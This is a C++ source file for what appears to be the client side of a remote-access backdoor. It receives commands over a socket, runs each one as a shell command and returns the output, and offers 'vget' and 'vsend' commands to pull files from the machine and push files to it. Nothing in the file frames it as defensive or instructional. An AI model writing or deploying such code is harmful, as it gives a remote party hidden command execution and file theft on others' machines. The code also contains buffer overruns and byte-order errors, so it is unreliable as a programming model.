#include "main.h"
#define RUNSTATEMENT "start run"

using namespace std;

OperateSocket::OperateSocket(SOCKET socketC) {
	OperateSocket::socketC = socketC;
	OperateSocket::moderun = false;
}

bool OperateSocket::wait_for_run(){
	Command command;
	if (moderun)
		return true;

	while (true) {
		int size = get_size_pkt();
		if (size <= 0)
			continue;
		cout << "size: " << size << endl;
		char* buf = new char[size];
		recv_func(&buf[0], size);
		if (strcmp(buf, "whoami") == 0) {
			char* data = command.run_command("whoami 2>&1");
			send_func(data, strlen(data));
		}
		if (strcmp(buf, RUNSTATEMENT) == 0) {
			return true;
		}
	}
	return false;
}

int OperateSocket::get_size_pkt(){
	char sizeBuff[5];
	memset(sizeBuff, '\0', sizeof(sizeBuff));
	int k = 0;
	while (k < 4) {
		int nbytes = recv(socketC, &sizeBuff[k], 1, 0);
		k++;
	};

	int* myints = (int*)sizeBuff;
	int sizePkt = ntohl(*myints);
	return sizePkt;
}

int OperateSocket::send_func(char* data, int lenData)
{
	send(socketC, (char*)&lenData, sizeof(int), 0);
	send(socketC, data, lenData, 0);
	return 0;
}

int OperateSocket::recv_func(char* buf, int size)
{
	int count = 0;
	char next_c;
	while (count < size) {
		recv(socketC, &next_c, 1, 0);
		buf[count] = next_c;
		count++;
	}
	buf[count] = '\0';
	return 0;
}

SOCKET OperateSocket::get_socketC()
{
	return socketC;
}

void OperateSocket::set_socketC(SOCKET s){
	socketC = s;
}

void OperateSocket::operate() {
	Command command;
	moderun = wait_for_run();
	while (moderun) {
		char* runcd = command.run_command("cd 2>&1");
		send_func(runcd, strlen(runcd));
		char* response = nullptr;
		int size = get_size_pkt();
		if (size <= 0)
			continue;

		char* buf = new char[size];
		recv_func(&buf[0], size);
		//////////////////////////////////////////////////////
		string str_buf(buf);
		Command command;
		if (str_buf.rfind("vexit", 0) == 0) {
			moderun = false;
			break;
		}
		else if (str_buf.rfind("vget", 0) == 0) {
			ManagerFile managerFile(socketC);
			string name_str = command.remove_substring(str_buf, "vget ");
			name_str = command.remove_substring(name_str, " 2>&1");
			LPSTR filename = (LPSTR)malloc(name_str.length() + 1);
			memcpy(filename, name_str.c_str(), strlen(name_str.c_str()) + 1);
			managerFile.sendFile(filename);
			continue;
		}
		else if (str_buf.rfind("vsend", 0) == 0) {
			ManagerFile managerFile(socketC);
			managerFile.receiveFile();
			continue;
		}
		/////////////////////////////////////////////////////
		response = command.run_command(buf);
		cout << "res:" << response << endl;
		send_func(response, strlen(response));
	}
}